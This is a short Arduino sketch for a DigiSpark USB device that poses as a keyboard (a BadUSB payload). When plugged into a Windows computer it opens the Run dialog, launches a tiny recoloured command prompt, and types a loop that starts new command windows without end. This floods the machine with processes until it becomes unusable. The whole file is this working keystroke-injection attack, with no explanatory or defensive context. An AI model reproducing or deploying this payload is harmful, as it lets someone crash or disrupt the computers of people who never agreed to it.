#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("cmd");
  delay(3000);
  DigiKeyboard.println("MODE CON: COLS=15 LINES=1");
  delay(2000);
  DigiKeyboard.println("COLOR EF");
  delay(2000);
  DigiKeyboard.println("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start");
  while(1);
}
